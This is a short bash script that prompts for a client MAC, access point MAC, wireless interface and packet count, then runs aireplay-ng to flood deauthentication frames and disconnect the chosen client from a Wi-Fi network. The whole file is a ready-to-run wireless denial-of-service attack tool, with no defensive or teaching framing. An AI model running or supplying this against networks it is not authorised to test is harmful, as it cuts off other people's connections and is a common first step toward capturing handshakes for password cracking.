#!/bin/bash
read -p "Enter Client MAC: " client_mac
read -p "Enter Interface Name: " interface_name
read -p "Enter AP MAC: " ap_mac
read -p "Enter Number of Packets to Deauth: " packet_count
sudo aireplay-ng --deauth $packet_count -a $ap_mac -c $client_mac $interface_name
